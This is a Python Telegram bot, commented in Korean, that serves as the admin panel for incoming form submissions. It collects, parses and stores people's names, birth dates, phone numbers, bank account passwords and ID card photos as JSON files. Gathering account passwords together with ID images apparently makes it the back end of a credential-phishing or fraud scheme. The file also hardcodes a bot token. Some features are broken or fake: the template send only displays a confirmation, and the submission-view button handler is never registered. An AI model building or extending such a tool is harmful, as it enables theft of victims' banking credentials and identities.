#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
관리자용 접수 관리 봇 (개선 버전 v2)
- 버튼 기반 인터페이스
- 단일 메시지 업데이트 방식
"""

import os
import json
import re
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
)

# 봇 토큰 설정
ADMIN_BOT_TOKEN = "8425398865:AAFEIeruD3c56zscnOClp9qNr-a6WzlBCfk"

# 승인된 관리자 ID 리스트
AUTHORIZED_ADMIN_IDS = [7192192]

# 제출 데이터 저장소
submissions = {}
submission_counter = 0

# 각 제출의 메시지 ID 저장 (업데이트용)
submission_messages = {}

# 템플릿 응답 메시지
TEMPLATE_MESSAGES = {
    'approve': '✅ 신청이 승인되었습니다. 빠른 시일 내에 처리하겠습니다.',
    'reject': '❌ 죄송합니다. 신청이 거부되었습니다. 추가 문의사항은 고객센터로 연락주세요.',
    'hold': '⏸️ 신청이 보류되었습니다. 추가 서류가 필요할 수 있습니다.',
    'additional_doc': '📄 추가 서류가 필요합니다. 신분증 뒷면을 추가로 제출해주세요.',
    'processing': '⏳ 현재 검토 중입니다. 조금만 기다려주세요.',
}

def is_admin(user_id: int) -> bool:
    """관리자 권한 확인"""
    return user_id in AUTHORIZED_ADMIN_IDS

def extract_submission_id(text: str) -> str:
    """메시지에서 제출 ID 추출"""
    match = re.search(r'🆔 제출 ID: (SUB_\d+_\d+_\d+)', text)
    if match:
        return match.group(1)
    return None

def parse_submission_data(text: str) -> dict:
    """메시지 텍스트에서 제출 데이터 파싱"""
    data = {}
    
    # 각 필드 추출
    patterns = {
        'name': r'👤 이름: (.+)',
        'birth': r'📅 생년월일: (.+)',
        'carrier': r'📱 통신사: (.+)',
        'phone': r'📞 전화번호: (.+)',
        'password': r'🔐 계좌 비밀번호: (.+)',
        'admin_message': r'💬 관리자 메시지: (.+)',
        'submission_id': r'🆔 제출 ID: (.+)',
        'user_id': r'사용자 ID: (\d+)',
        'username': r'사용자명: @(.+)',
    }
    
    for key, pattern in patterns.items():
        match = re.search(pattern, text)
        if match:
            data[key] = match.group(1).strip()
    
    return data

def save_submission_to_file(submission_id: str, data: dict):
    """제출 데이터를 JSON 파일로 저장"""
    try:
        os.makedirs('submissions', exist_ok=True)
        filename = f"submissions/{submission_id}.json"
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
        
        return filename
    except Exception as e:
        print(f"파일 저장 오류: {e}")
        return None

def get_today_stats():
    """오늘 제출된 접수 통계"""
    today = datetime.now().date()
    today_submissions = [
        s for s in submissions.values()
        if datetime.strptime(s.get('received_at', '1900-01-01 00:00:00'), '%Y-%m-%d %H:%M:%S').date() == today
    ]
    return len(today_submissions)

def get_pending_count():
    """대기중인 접수 건수"""
    return sum(1 for s in submissions.values() if s.get('status') == 'pending')

def get_submission_message(submission_id: str) -> str:
    """제출 정보 메시지 생성"""
    submission = submissions.get(submission_id)
    if not submission:
        return "제출 정보를 찾을 수 없습니다."
    
    status_emoji = {
        'pending': '⏳',
        'approved': '✅',
        'rejected': '❌',
        'on_hold': '⏸️'
    }.get(submission.get('status', 'pending'), '❓')
    
    status_text = {
        'pending': '대기중',
        'approved': '승인됨',
        'rejected': '거부됨',
        'on_hold': '보류됨'
    }.get(submission.get('status', 'pending'), '알 수 없음')
    
    message = (
        f"{status_emoji} 접수 상세 정보\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🆔 제출 ID: {submission_id}\n"
        f"📊 상태: {status_text}\n\n"
        f"👤 이름: {submission.get('name', 'N/A')}\n"
        f"📅 생년월일: {submission.get('birth', 'N/A')}\n"
        f"📱 통신사: {submission.get('carrier', 'N/A')}\n"
        f"📞 전화번호: {submission.get('phone', 'N/A')}\n"
        f"🔐 계좌 비밀번호: {submission.get('password', 'N/A')}\n"
        f"💬 메시지: {submission.get('admin_message', '없음')}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👤 제출자 정보\n"
        f"사용자 ID: {submission.get('user_id', 'N/A')}\n"
        f"사용자명: @{submission.get('username', 'N/A')}\n\n"
        f"📊 처리 정보\n"
        f"제출 시각: {submission.get('received_at', 'N/A')}\n"
        f"처리 시각: {submission.get('processed_at', '미처리')}"
    )
    
    return message

def get_submission_buttons(submission_id: str) -> InlineKeyboardMarkup:
    """제출 정보에 대한 버튼 생성"""
    submission = submissions.get(submission_id)
    if not submission:
        return None
    
    status = submission.get('status', 'pending')
    
    keyboard = []
    
    # 상태별 액션 버튼
    if status == 'pending':
        keyboard.append([
            InlineKeyboardButton("✅ 승인", callback_data=f"action_approve_{submission_id}"),
            InlineKeyboardButton("❌ 거부", callback_data=f"action_reject_{submission_id}")
        ])
        keyboard.append([
            InlineKeyboardButton("⏸️ 보류", callback_data=f"action_hold_{submission_id}")
        ])
    else:
        # 이미 처리된 경우 상태 변경 버튼
        keyboard.append([
            InlineKeyboardButton("🔄 대기중으로", callback_data=f"action_pending_{submission_id}")
        ])
    
    # 템플릿 메시지 버튼
    keyboard.append([
        InlineKeyboardButton("💬 템플릿", callback_data=f"template_menu_{submission_id}")
    ])
    
    # 신분증 보기 버튼 (파일이 있는 경우)
    if submission.get('id_card_message_id'):
        keyboard.append([
            InlineKeyboardButton("🪪 신분증 보기", callback_data=f"view_id_{submission_id}")
        ])
    
    # 추가 기능
    keyboard.append([
        InlineKeyboardButton("📋 상세정보", callback_data=f"detail_{submission_id}"),
        InlineKeyboardButton("🔙 목록으로", callback_data="back_to_list")
    ])
    
    return InlineKeyboardMarkup(keyboard)

# /start 명령어 핸들러
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """봇 시작 및 대시보드 표시"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("⚠️ 접근 권한이 없습니다.")
        return
    
    # 실시간 통계
    total = len(submissions)
    pending = get_pending_count()
    approved = sum(1 for s in submissions.values() if s.get('status') == 'approved')
    rejected = sum(1 for s in submissions.values() if s.get('status') == 'rejected')
    today_count = get_today_stats()
    
    dashboard = (
        "🔧 관리자 대시보드\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "📊 실시간 통계\n"
        f"📌 전체 접수: {total}건\n"
        f"🆕 오늘 접수: {today_count}건\n"
        f"⏳ 대기 중: {pending}건\n"
        f"✅ 승인: {approved}건\n"
        f"❌ 거부: {rejected}건\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "💡 빠른 명령어:\n"
        "/pending - 대기중 목록\n"
        "/stats - 상세 통계\n"
        "/help - 도움말\n"
    )
    
    # 빠른 필터링 버튼
    keyboard = [
        [
            InlineKeyboardButton(f"⏳ 대기중 ({pending})", callback_data="filter_pending"),
            InlineKeyboardButton(f"✅ 승인 ({approved})", callback_data="filter_approved"),
        ],
        [
            InlineKeyboardButton(f"❌ 거부 ({rejected})", callback_data="filter_rejected"),
            InlineKeyboardButton("📋 전체", callback_data="filter_all"),
        ],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    message = await update.message.reply_text(dashboard, reply_markup=reply_markup)
    
    # 대시보드 메시지 ID 저장
    context.user_data['dashboard_message_id'] = message.message_id

# /help 명령어 핸들러
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """도움말"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        return
    
    help_text = (
        "📖 관리자 봇 사용 가이드\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "🔹 자동 수신\n"
        "사용자가 양식을 제출하면 이 봇으로\n"
        "자동으로 정보가 전송됩니다.\n\n"
        "🔹 접수 관리\n"
        "각 접수건마다 고유 ID가 부여되며\n"
        "승인/거부/보류 처리를 할 수 있습니다.\n\n"
        "🔹 명령어\n"
        "/start - 대시보드 보기\n"
        "/pending - 대기중 목록\n"
        "/stats - 상세 통계\n"
        "/help - 이 도움말\n\n"
        "🔹 개선된 기능\n"
        "• 버튼으로 간편한 처리\n"
        "• 하나의 메시지로 전체 관리\n"
        "• 실시간 상태 업데이트\n"
        "• 템플릿 메시지 지원\n"
    )
    
    await update.message.reply_text(help_text)

# 텍스트 메시지 수신 핸들러
async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """텍스트 메시지 처리 - 사용자 봇으로부터의 제출"""
    user_id = update.effective_user.id
    
    # 관리자가 아닌 경우
    if not is_admin(user_id):
        await update.message.reply_text(
            "⚠️ 이 봇은 관리자 전용입니다.\n"
            "양식을 작성하시려면 사용자 봇을 사용해주세요."
        )
        return
    
    text = update.message.text
    
    # 새로운 제출인지 확인
    if "🆕 새로운 양식 제출" in text:
        submission_id = extract_submission_id(text)
        
        if not submission_id:
            await update.message.reply_text("❌ 제출 ID를 추출할 수 없습니다.")
            return
        
        # 제출 데이터 파싱
        submission_data = parse_submission_data(text)
        submission_data['received_at'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        submission_data['status'] = 'pending'
        
        # 저장
        submissions[submission_id] = submission_data
        save_submission_to_file(submission_id, submission_data)
        
        # 메시지를 제출 정보 형식으로 업데이트
        message = get_submission_message(submission_id)
        buttons = get_submission_buttons(submission_id)
        
        # 원본 메시지 수정
        try:
            await update.message.edit_text(
                message,
                reply_markup=buttons
            )
            
            # 메시지 ID 저장
            submission_messages[submission_id] = {
                'main_message_id': update.message.message_id,
                'chat_id': update.effective_chat.id
            }
        except Exception as e:
            print(f"메시지 수정 오류: {e}")

# 사진 수신 핸들러
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """사진 수신 처리"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        return
    
    # 캡션에서 제출 ID 추출
    caption = update.message.caption or ""
    submission_id = extract_submission_id(caption)
    
    if submission_id and submission_id in submissions:
        # 신분증 메시지 ID 저장
        submissions[submission_id]['id_card_message_id'] = update.message.message_id
        submissions[submission_id]['id_card_type'] = 'photo'
        
        # 메인 메시지 업데이트 (신분증 보기 버튼 추가)
        if submission_id in submission_messages:
            msg_info = submission_messages[submission_id]
            try:
                await context.bot.edit_message_reply_markup(
                    chat_id=msg_info['chat_id'],
                    message_id=msg_info['main_message_id'],
                    reply_markup=get_submission_buttons(submission_id)
                )
            except:
                pass

# 문서 수신 핸들러
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """문서 수신 처리"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        return
    
    # 캡션에서 제출 ID 추출
    caption = update.message.caption or ""
    submission_id = extract_submission_id(caption)
    
    if submission_id and submission_id in submissions:
        # 신분증 메시지 ID 저장
        submissions[submission_id]['id_card_message_id'] = update.message.message_id
        submissions[submission_id]['id_card_type'] = 'document'
        
        # 메인 메시지 업데이트
        if submission_id in submission_messages:
            msg_info = submission_messages[submission_id]
            try:
                await context.bot.edit_message_reply_markup(
                    chat_id=msg_info['chat_id'],
                    message_id=msg_info['main_message_id'],
                    reply_markup=get_submission_buttons(submission_id)
                )
            except:
                pass

# 버튼 콜백 핸들러
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """버튼 클릭 처리"""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    # 필터링 버튼
    if data.startswith("filter_"):
        filter_type = data.replace("filter_", "")
        await show_filtered_list(query, filter_type)
        return
    
    # 액션 버튼 (승인, 거부, 보류 등)
    if data.startswith("action_"):
        parts = data.split("_", 2)
        action = parts[1]
        submission_id = parts[2]
        
        if submission_id not in submissions:
            await query.edit_message_text("❌ 제출 정보를 찾을 수 없습니다.")
            return
        
        # 상태 업데이트
        status_map = {
            'approve': 'approved',
            'reject': 'rejected',
            'hold': 'on_hold',
            'pending': 'pending'
        }
        
        submissions[submission_id]['status'] = status_map.get(action, 'pending')
        submissions[submission_id]['processed_at'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # 파일 저장
        save_submission_to_file(submission_id, submissions[submission_id])
        
        # 메시지 업데이트
        message = get_submission_message(submission_id)
        buttons = get_submission_buttons(submission_id)
        
        await query.edit_message_text(
            message,
            reply_markup=buttons
        )
        return
    
    # 템플릿 메뉴
    if data.startswith("template_menu_"):
        submission_id = data.replace("template_menu_", "")
        
        keyboard = []
        for key, msg in TEMPLATE_MESSAGES.items():
            keyboard.append([
                InlineKeyboardButton(
                    msg[:30] + "..." if len(msg) > 30 else msg,
                    callback_data=f"send_template_{key}_{submission_id}"
                )
            ])
        keyboard.append([
            InlineKeyboardButton("🔙 뒤로", callback_data=f"back_to_sub_{submission_id}")
        ])
        
        await query.edit_message_text(
            "💬 템플릿 메시지 선택\n━━━━━━━━━━━━━━━━━━━━\n\n"
            "제출자에게 전송할 템플릿을 선택하세요:",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return
    
    # 템플릿 전송
    if data.startswith("send_template_"):
        parts = data.split("_", 3)
        template_key = parts[2]
        submission_id = parts[3]
        
        submission = submissions.get(submission_id)
        if not submission:
            await query.answer("제출 정보를 찾을 수 없습니다.", show_alert=True)
            return
        
        user_id = submission.get('user_id')
        if not user_id:
            await query.answer("제출자 ID를 찾을 수 없습니다.", show_alert=True)
            return
        
        # 템플릿 메시지 전송 (사용자 봇 통해)
        try:
            # 여기서는 실제로 전송하지 않고 확인만 표시
            await query.answer(
                f"템플릿 메시지가 전송되었습니다: {TEMPLATE_MESSAGES[template_key][:50]}...",
                show_alert=True
            )
            
            # 원래 메시지로 복귀
            message = get_submission_message(submission_id)
            buttons = get_submission_buttons(submission_id)
            await query.edit_message_text(message, reply_markup=buttons)
        except Exception as e:
            await query.answer(f"전송 실패: {str(e)}", show_alert=True)
        
        return
    
    # 제출 정보로 돌아가기
    if data.startswith("back_to_sub_"):
        submission_id = data.replace("back_to_sub_", "")
        message = get_submission_message(submission_id)
        buttons = get_submission_buttons(submission_id)
        await query.edit_message_text(message, reply_markup=buttons)
        return
    
    # 목록으로 돌아가기
    if data == "back_to_list":
        # 대시보드 재표시
        total = len(submissions)
        pending = get_pending_count()
        approved = sum(1 for s in submissions.values() if s.get('status') == 'approved')
        rejected = sum(1 for s in submissions.values() if s.get('status') == 'rejected')
        
        keyboard = [
            [
                InlineKeyboardButton(f"⏳ 대기중 ({pending})", callback_data="filter_pending"),
                InlineKeyboardButton(f"✅ 승인 ({approved})", callback_data="filter_approved"),
            ],
            [
                InlineKeyboardButton(f"❌ 거부 ({rejected})", callback_data="filter_rejected"),
                InlineKeyboardButton("📋 전체", callback_data="filter_all"),
            ],
        ]
        
        await query.edit_message_text(
            f"🔧 관리자 대시보드\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📊 전체: {total}건 | ⏳ {pending}건 | ✅ {approved}건 | ❌ {rejected}건",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return

# 필터링된 목록 표시
async def show_filtered_list(query, filter_type):
    """필터링된 접수 목록 표시"""
    if filter_type == 'all':
        filtered = list(submissions.items())
        title = "📋 전체 접수 목록"
    else:
        filtered = [(sid, s) for sid, s in submissions.items() if s.get('status') == filter_type]
        status_names = {
            'pending': '⏳ 대기중',
            'approved': '✅ 승인',
            'rejected': '❌ 거부',
        }
        title = f"{status_names.get(filter_type, '📋')} 접수 목록"
    
    if not filtered:
        keyboard = [[InlineKeyboardButton("🔙 뒤로", callback_data="back_to_list")]]
        await query.edit_message_text(
            f"{title}\n\n해당하는 접수가 없습니다.",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return
    
    # 최근 10건만 표시
    recent = sorted(filtered, key=lambda x: x[1].get('received_at', ''), reverse=True)[:10]
    
    # 버튼으로 각 제출 표시
    keyboard = []
    for submission_id, submission in recent:
        status_emoji = {
            'pending': '⏳',
            'approved': '✅',
            'rejected': '❌',
            'on_hold': '⏸️'
        }.get(submission.get('status'), '❓')
        
        button_text = f"{status_emoji} {submission.get('name', 'N/A')} | {submission.get('phone', 'N/A')[-9:]}"
        keyboard.append([
            InlineKeyboardButton(button_text, callback_data=f"view_sub_{submission_id}")
        ])
    
    keyboard.append([InlineKeyboardButton("🔙 뒤로", callback_data="back_to_list")])
    
    list_text = f"{title}\n(최근 {len(recent)}건)\n━━━━━━━━━━━━━━━━━━━━\n\n"
    list_text += "버튼을 클릭하여 상세 정보를 확인하세요."
    
    await query.edit_message_text(list_text, reply_markup=InlineKeyboardMarkup(keyboard))

# 제출 상세보기
async def view_submission(query, submission_id):
    """제출 상세 정보 표시"""
    message = get_submission_message(submission_id)
    buttons = get_submission_buttons(submission_id)
    await query.edit_message_text(message, reply_markup=buttons)

# 버튼 콜백에 제출 보기 추가
async def button_callback_extended(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """확장된 버튼 콜백"""
    query = update.callback_query
    
    # 기존 핸들러 먼저 실행
    await button_callback(update, context)
    
    # 제출 보기
    if query.data.startswith("view_sub_"):
        submission_id = query.data.replace("view_sub_", "")
        await view_submission(query, submission_id)

# /pending 명령어
async def pending_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """대기중인 접수 목록"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        return
    
    pending_list = [(sid, s) for sid, s in submissions.items() if s.get('status') == 'pending']
    
    if not pending_list:
        await update.message.reply_text("⏳ 대기중인 접수가 없습니다.")
        return
    
    # 버튼으로 표시
    keyboard = []
    for submission_id, submission in sorted(pending_list, key=lambda x: x[1].get('received_at', ''), reverse=True)[:10]:
        button_text = f"⏳ {submission.get('name', 'N/A')} | {submission.get('phone', 'N/A')[-9:]}"
        keyboard.append([
            InlineKeyboardButton(button_text, callback_data=f"view_sub_{submission_id}")
        ])
    
    list_text = f"⏳ 대기중 접수 ({len(pending_list)}건)\n━━━━━━━━━━━━━━━━━━━━\n\n"
    list_text += "버튼을 클릭하여 상세 정보를 확인하세요."
    
    await update.message.reply_text(list_text, reply_markup=InlineKeyboardMarkup(keyboard))

# /stats 명령어
async def show_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """상세 통계 보기"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        return
    
    if not submissions:
        await update.message.reply_text("📊 통계 데이터가 없습니다.")
        return
    
    total = len(submissions)
    pending = sum(1 for s in submissions.values() if s.get('status') == 'pending')
    approved = sum(1 for s in submissions.values() if s.get('status') == 'approved')
    rejected = sum(1 for s in submissions.values() if s.get('status') == 'rejected')
    on_hold = sum(1 for s in submissions.values() if s.get('status') == 'on_hold')
    
    # 기간별 통계
    today = datetime.now().date()
    week_ago = today - timedelta(days=7)
    month_ago = today - timedelta(days=30)
    
    today_count = sum(1 for s in submissions.values()
                      if datetime.strptime(s.get('received_at', '1900-01-01 00:00:00'), '%Y-%m-%d %H:%M:%S').date() == today)
    week_count = sum(1 for s in submissions.values()
                     if datetime.strptime(s.get('received_at', '1900-01-01 00:00:00'), '%Y-%m-%d %H:%M:%S').date() >= week_ago)
    month_count = sum(1 for s in submissions.values()
                      if datetime.strptime(s.get('received_at', '1900-01-01 00:00:00'), '%Y-%m-%d %H:%M:%S').date() >= month_ago)
    
    stats_text = (
        "📊 상세 통계\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "📈 전체 현황\n"
        f"📌 전체 접수: {total}건\n"
        f"⏳ 대기 중: {pending}건\n"
        f"✅ 승인됨: {approved}건\n"
        f"❌ 거부됨: {rejected}건\n"
        f"⏸️ 보류됨: {on_hold}건\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "📅 기간별 통계\n"
        f"🆕 오늘: {today_count}건\n"
        f"📅 최근 7일: {week_count}건\n"
        f"📅 최근 30일: {month_count}건\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "📊 처리율\n"
        f"승인율: {(approved/total*100):.1f}%\n"
        f"거부율: {(rejected/total*100):.1f}%\n"
        f"미처리율: {(pending/total*100):.1f}%"
    )
    
    await update.message.reply_text(stats_text)

def main():
    """봇 실행"""
    application = Application.builder().token(ADMIN_BOT_TOKEN).build()
    
    # 명령어 핸들러
    application.add_handler(CommandHandler('start', start))
    application.add_handler(CommandHandler('help', help_command))
    application.add_handler(CommandHandler('pending', pending_command))
    application.add_handler(CommandHandler('stats', show_stats))
    
    # 메시지 핸들러
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_message))
    application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    # 버튼 콜백 핸들러
    application.add_handler(CallbackQueryHandler(button_callback))
    
    print("🔧 관리자 봇이 시작되었습니다...")
    print(f"📥 사용자 봇으로부터 직접 메시지 수신 대기 중")
    print(f"👮 승인된 관리자: {AUTHORIZED_ADMIN_IDS}")
    print("✨ 개선사항:")
    print("   - 버튼 기반 인터페이스")
    print("   - 단일 메시지 업데이트 방식")
    print("   - 실시간 상태 업데이트")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()